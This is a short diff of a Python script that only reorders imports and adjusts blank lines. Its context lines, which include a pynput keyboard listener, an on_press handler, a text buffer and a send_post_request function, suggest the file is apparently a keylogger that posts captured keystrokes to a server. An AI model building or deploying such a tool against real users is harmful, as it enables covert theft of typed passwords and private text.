@@ -1,8 +1,9 @@
 import json
 import threading
+
 import requests
-from pynput import keyboard
 from icecream import ic
+from pynput import keyboard
 
 text = ""
 
@@ -27,7 +28,6 @@ def send_post_request():
         ic(f"JSON encoding error: {e}")
     except Exception as e:
         ic(f"An unexpected error occurred: {e}")
-
 
 
 def on_press(key):
